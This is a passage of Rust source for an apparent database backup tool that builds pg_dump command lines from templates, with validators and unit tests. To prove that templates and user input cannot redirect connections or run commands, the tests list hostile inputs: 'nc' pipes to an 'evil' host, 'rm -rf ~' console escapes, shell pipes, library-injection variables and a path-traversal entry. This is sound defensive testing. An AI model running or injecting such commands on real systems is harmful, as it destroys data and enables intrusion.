            .any(|prefix| stem.starts_with(prefix))
}

/// An absolute folder without `..`, with at most one `*`, standing for
/// part of one folder name.
fn location_ok(location: &str) -> bool {
    let unix = location.starts_with('/');
    let bytes = location.as_bytes();
    let windows = bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && matches!(bytes[2], b'\\' | b'/');
    (unix || windows)
        && location.len() <= 256
        && plain_text(location)
        && location.split(['/', '\\']).all(|part| part != "..")
        && location.matches('*').count() <= 1
}

/// An environment variable a command may set.
fn env_name_ok(name: &str) -> bool {
    let upper = name.to_ascii_uppercase();
    !name.is_empty()
        && name.len() <= 64
        && name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
        && !name.as_bytes()[0].is_ascii_digit()
        && !DENIED_ENV.contains(&upper.as_str())
        && !DENIED_ENV_PREFIXES
            .iter()
            .any(|prefix| upper.starts_with(prefix))
        && !upper
            .split('_')
            .any(|word| DENIED_ENV_PARTS.iter().any(|part| word.contains(part)))
}

/// A schema, or a relation in one.
#[derive(Clone, Debug, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
pub struct ObjectRef {
    pub schema: String,
    pub name: Option<String>,
}

/// A task to run, as the user set it up.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct TaskRequest {
    pub kind: TaskKind,
    pub settings: TaskSettings,
    /// What to back up; empty for everything.
    pub objects: Vec<ObjectRef>,
    /// The file or folder to write or read, absolute.
    pub path: String,
}

/// A program to run, as [`Task::build`] filled it in.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ToolCommand {
    /// A program of the task's, by name.
    pub program: String,
    pub args: Vec<String>,
    pub env: Vec<(String, String)>,
    /// The variable that carries the password.
    pub password_env: Option<String>,
    /// Write standard output to the path.
    pub stdout_to_path: bool,
    /// Feed the path to standard input.
    pub stdin_from_path: bool,
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::DriverId;

    fn when(field: &str, values: &[&str]) -> Vec<Condition> {
        vec![Condition {
            field: field.into(),
            values: values.iter().map(|v| (*v).to_owned()).collect(),
            except: false,
        }]
    }

    fn text(t: &str) -> Piece {
        Piece::Text(t.into())
    }

    fn arg(when: Vec<Condition>, pieces: Vec<Piece>) -> CommandPart {
        CommandPart::Argument(Argument {
            when,
            pieces,
            each: None,
        })
    }

    fn field(id: &str, kind: FieldKind, default: &str) -> Field {
        Field {
            id: id.into(),
            label: id.into(),
            help: String::new(),
            section: "S".into(),
            kind,
            default: default.into(),
            when: Vec::new(),
        }
    }

    /// A small pg_dump-like task.
    fn task() -> Task {
        Task {
            kind: TaskKind::Backup,
            programs: vec!["pg_dump".into()],
            locations: vec!["/usr/lib/postgresql/*/bin".into()],
            version_arg: Some("--version".into()),
            fields: vec![
                field(
                    "format",
                    FieldKind::Choice(vec![
                        Choice {
                            value: "custom".into(),
                            label: "Custom".into(),
                        },
                        Choice {
                            value: "directory".into(),
                            label: "Directory".into(),
                        },
                    ]),
                    "custom",
                ),
                Field {
                    when: when("format", &["directory"]),
                    ..field("jobs", FieldKind::Number { min: 1, max: 8 }, "1")
                },
                field("skip", FieldKind::Text, ""),
                field("extra", FieldKind::Text, ""),
                field("verify", FieldKind::Flag, "true"),
            ],
            objects: true,
            targets: vec![
                Target {
                    when: when("format", &["directory"]),
                    kind: PathKind::Directory,
                    extension: String::new(),
                },
                Target {
                    when: Vec::new(),
                    kind: PathKind::File,
                    extension: "dump".into(),
                },
            ],
            connection: Connection {
                host: Some(Binding::Env("PGHOST".into())),
                port: Some(Binding::Env("PGPORT".into())),
                user: Some(Binding::Env("PGUSER".into())),
                database: Some(Binding::Option("--dbname=".into())),
                password_env: Some("PGPASSWORD".into()),
                database_field: None,
            },
            commands: vec![CommandTemplate {
                program: "pg_dump".into(),
                when: Vec::new(),
                parts: vec![
                    arg(
                        Vec::new(),
                        vec![
                            text("--format="),
                            Piece::Value(ValuePiece {
                                field: "format".into(),
                                map: vec![
                                    ("custom".into(), "c".into()),
                                    ("directory".into(), "d".into()),
                                ],
                            }),
                        ],
                    ),
                    arg(
                        vec![
                            when("format", &["directory"]).remove(0),
                            Condition {
                                field: "jobs".into(),
                                values: vec!["1".into()],
                                except: true,
                            },
                        ],
                        vec![
                            text("--jobs="),
                            Piece::Value(ValuePiece {
                                field: "jobs".into(),
                                map: Vec::new(),
                            }),
                        ],
                    ),
                    CommandPart::Argument(Argument {
                        when: Vec::new(),
                        pieces: vec![
                            text("--exclude-table="),
                            Piece::Value(ValuePiece {
                                field: "skip".into(),
                                map: Vec::new(),
                            }),
                        ],
                        each: Some("skip".into()),
                    }),
                    arg(Vec::new(), vec![text("--file="), Piece::Path]),
                    CommandPart::Objects(ObjectArguments {
                        schema_prefix: "--schema=".into(),
                        table_prefix: "--table=".into(),
                        quoting: Quoting::Double,
                        schema_tables: Some(".*".into()),
                    }),
                    CommandPart::Extra("extra".into()),
                ],
                variables: vec![
                    Variable {
                        when: vec![
                            when(SSL_SETTING, &["require"]).remove(0),
                            when("verify", &["true"]).remove(0),
                        ],
                        name: "PGSSLMODE".into(),
                        pieces: vec![text("verify-full")],
                    },
                    Variable {
                        when: when(SSL_SETTING, &["disable"]),
                        name: "PGSSLMODE".into(),
                        pieces: vec![text("disable")],
                    },
                ],
                stdout_to_path: false,
                stdin_from_path: false,
            }],
        }
    }

    fn profile() -> ConnectionProfile {
        let mut profile = ConnectionProfile::new(DriverId::new("postgres"), 5433);
        profile.host = "db.example.com".into();
        profile.username = "app".into();
        profile.database = "shop".into();
        profile.ssl = SslMode::Require;
        profile
    }

    fn request(settings: &[(&str, &str)]) -> TaskRequest {
        TaskRequest {
            kind: TaskKind::Backup,
            settings: settings
                .iter()
                .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
                .collect(),
            objects: vec![
                ObjectRef {
                    schema: "Sales".into(),
                    name: None,
                },
                ObjectRef {
                    schema: "public".into(),
                    name: Some("odd\"name".into()),
                },
            ],
            path: "/backups/shop".into(),
        }
    }

    #[test]
    fn templates_fill_from_settings_and_the_profile() {
        let task = task();
        task.check().expect("valid");
        let built = task
            .build(
                &profile(),
                &request(&[
                    ("format", "directory"),
                    ("jobs", "4"),
                    ("skip", "logs.*, audit"),
                    ("extra", "--no-owner '--lock-wait-timeout=5s'"),
                ]),
            )
            .expect("built");
        assert_eq!(built.program, "pg_dump");
        assert_eq!(
            built.args,
            [
                "--dbname=shop",
                "--format=d",
                "--jobs=4",
                "--exclude-table=logs.*",
                "--exclude-table=audit",
                "--file=/backups/shop",
                "--table=\"Sales\".*",
                "--table=\"public\".\"odd\"\"name\"",
                "--no-owner",
                "--lock-wait-timeout=5s",
            ]
        );
        assert_eq!(
            built.env,
            [
                ("PGHOST".to_owned(), "db.example.com".to_owned()),
                ("PGPORT".to_owned(), "5433".to_owned()),
                ("PGUSER".to_owned(), "app".to_owned()),
                ("PGSSLMODE".to_owned(), "verify-full".to_owned()),
            ]
        );
        assert_eq!(built.password_env.as_deref(), Some("PGPASSWORD"));

        // Defaults: no jobs (1), custom, unverified TLS off on loopback.
        let mut local = profile();
        local.host = "localhost".into();
        local.ssl = SslMode::Disable;
        let built = task.build(&local, &request(&[])).expect("built");
        assert!(built.args.contains(&"--format=c".to_owned()));
        assert!(!built.args.iter().any(|a| a.starts_with("--jobs")));
        assert!(
            built
                .env
                .contains(&("PGSSLMODE".to_owned(), "disable".to_owned()))
        );
        assert!(task.vocabulary().contains(&"--format=<format>".to_owned()));
    }

    #[test]
    fn templates_cannot_reach_another_server_or_run_commands() {
        let refuse = |change: &dyn Fn(&mut Task)| {
            let mut bad = task();
            change(&mut bad);
            bad.check().expect_err("refused")
        };
        // Fixed text setting the connection by its option.
        refuse(&|t| {
            t.commands[0]
                .parts
                .push(arg(Vec::new(), vec![text("--dbname=host=evil")]));
        });
        // A variable the connection owns.
        refuse(&|t| {
            t.commands[0].variables.push(Variable {
                when: Vec::new(),
                name: "pghost".into(),
                pieces: vec![text("evil")],
            });
        });
        refuse(&|t| {
            t.commands[0].variables.push(Variable {
                when: Vec::new(),
                name: "PGPASSWORD".into(),
                pieces: vec![text("x")],
            });
        });
        // Pipes and console commands in fixed text, choices or defaults.
        refuse(&|t| {
            t.commands[0]
                .parts
                .push(arg(Vec::new(), vec![text("--output=|nc evil 1")]));
        });
        refuse(&|t| {
            if let FieldKind::Choice(choices) = &mut t.fields[0].kind {
                choices[0].value = "\\! rm -rf ~".into();
            }
            t.fields[0].default = "\\! rm -rf ~".into();
        });
        refuse(&|t| t.fields[3].default = "--dbname=host=evil".into());
        // Shells, undeclared programs, unknown fields.
        refuse(&|t| {
            t.programs.push("python3.12".into());
        });
        refuse(&|t| t.commands[0].program = "psql".into());
        refuse(&|t| t.fields[1].when[0].field = "nope".into());
        refuse(&|t| t.locations = vec!["relative/bin".into()]);
        refuse(&|t| t.locations = vec!["/usr/../etc".into()]);
        refuse(&|t| {
            t.commands[0].variables.push(Variable {
                when: Vec::new(),
                name: "DYLD_INSERT_LIBRARIES".into(),
                pieces: vec![text("/x")],
            });
        });
        refuse(&|t| {
            t.commands[0]
                .parts
                .push(CommandPart::Extra("format".into()))
        });
    }

    #[test]
    fn templates_cannot_name_a_connection_themselves() {
        for text in [
            "--host=evil",
            "--port=1",
            "-h",
            "-hevil",
            "--dbname=host=evil",
            "host=evil dbname=x",
            "postgresql://evil/x",
            "--username=root",
            "--service=x",
        ] {
            assert!(names_a_connection(text), "{text}");
        }
        for text in [
            "--no-password",
            "--format=",
            "--role=",
            "--set=ON_ERROR_STOP=1",
            "--exclude-table=",
            "--echo-errors",
            "plain",
            "--use-set-session-authorization",
        ] {
            assert!(!names_a_connection(text), "{text}");
        }
        for name in [
            "PGHOSTADDR",
            "PGSERVICE",
            "MYSQL_HOST",
            "PGPORT",
            "DB_PASSWORD",
        ] {
            assert!(connection_variable(name), "{name}");
        }
        for name in [
            "PGSSLMODE",
            "PGAPPNAME",
            "PGCONNECT_TIMEOUT",
            "PGSSLROOTCERT",
        ] {
            assert!(!connection_variable(name), "{name}");
        }
        let mut bad = task();
        bad.connection.password_env = Some("PGAPPNAME".into());
        assert!(
            bad.check().is_err(),
            "the password into an application name"
        );
        let mut mysql = task();
        mysql.connection.password_env = Some("MYSQL_PWD".into());
        assert!(mysql.check().is_ok(), "MySQL's password variable");
        let mut bad = task();
        bad.connection.password_env = Some("PWD".into());
        assert!(bad.check().is_err(), "the working folder's variable");
        let mut bad = task();
        bad.connection.password_env = Some("LOG_PWD".into());
        assert!(bad.check().is_err(), "any other *_PWD");
        let mut bad = task();
        bad.commands[0].variables.push(Variable {
            when: Vec::new(),
            name: "PGHOSTADDR".into(),
            pieces: vec![text("6.6.6.6")],
        });
        assert!(bad.check().is_err());
        let mut bad = task();
        bad.connection.database = Some(Binding::Env("PGDATABASE".into()));
        bad.commands[0]
            .parts
            .push(arg(Vec::new(), vec![text("--host=evil")]));
        assert!(
            bad.check().is_err(),
            "even with the connection in variables"
        );
    }

    #[test]
    fn values_the_user_types_still_cannot_move_the_connection() {
        let mut profile = profile();
        profile.database = "x host=evil".into();
        // As an option, `key=value` would be read as a connection string.
        assert!(task().build(&profile, &request(&[])).is_err());
        profile.database = "postgresql://evil/x".into();
        assert!(task().build(&profile, &request(&[])).is_err());
        // Through a variable it is only a name.
        let mut through_env = task();
        through_env.connection.database = Some(Binding::Env("PGDATABASE".into()));
        profile.database = "x host=evil".into();
        let built = through_env.build(&profile, &request(&[])).expect("built");
        assert!(
            built
                .env
                .contains(&("PGDATABASE".to_owned(), "x host=evil".to_owned()))
        );
        assert!(
            built
                .env
                .contains(&("PGHOST".to_owned(), "db.example.com".to_owned()))
        );
    }

    #[test]
    fn downloads_are_https_digested_and_relative() {
        let good = Download {
            platform: "macos-aarch64".into(),
            url: "https://example.com/pg.tar.gz".into(),
            sha256: "a".repeat(64),
            size: 13 << 20,
            label: "PostgreSQL 18.6 client".into(),
            root: "postgresql-18.6.0-aarch64-apple-darwin".into(),
            extract: vec!["bin/pg_dump".into(), "lib/".into()],
            bin: "bin".into(),
        };
        assert!(good.check().is_ok());
        for bad in [
            Download {
                url: "http://example.com/pg.tar.gz".into(),
                ..good.clone()
            },
            Download {
                sha256: "abc".into(),
                ..good.clone()
            },
            Download {
                extract: vec!["../../.zshrc".into()],
                ..good.clone()
            },
            Download {
                root: "/etc".into(),
                ..good.clone()
            },
            Download {
                size: MAX_DOWNLOAD + 1,
                ..good.clone()
            },
            Download {
                platform: "plan9".into(),
                ..good.clone()
            },
        ] {
            assert!(bad.check().is_err(), "{bad:?}");
        }
    }

    #[test]
    fn typed_arguments_split_like_a_shell() {
        assert_eq!(
            split_args(r#"--exclude-table='a b' -t "x\"y"  --lock-wait-timeout=5s "" "#),
            [
                "--exclude-table=a b",
                "-t",
                "x\"y",
                "--lock-wait-timeout=5s",
                ""
            ]
        );
        assert!(split_args("   ").is_empty());
    }

    #[test]
    fn console_commands_are_spotted_but_paths_are_not() {
        for arg in [
            "--command=\\! rm -rf ~",
            "-o|sh",
            "--command=x;\\o\tfile",
            "--command=\\gexec",
            "--execute=system rm -rf ~",
            "--command=C:\\ \\gexec",
            "-c \\copy t to program 'sh'",
        ] {
            assert!(runs_commands(arg), "{arg}");
        }
        for arg in [
            "--file=/b/x.sql",
            "--set=ON_ERROR_STOP=1",
            r"--file=C:\Users\ian\insert.sql",
            "--exclude-table=system_logs",
            "system",
        ] {
            assert!(!runs_commands(arg), "{arg}");
        }
        assert!(env_name_ok("PGSSLROOTCERT"));
        for name in [
            "PATH",
            "ld_preload",
            "PGPASSFILE",
            "PGSERVICEFILE",
            "A=B",
            "PSQLRC",
        ] {
            assert!(!env_name_ok(name), "{name}");
        }
    }
}
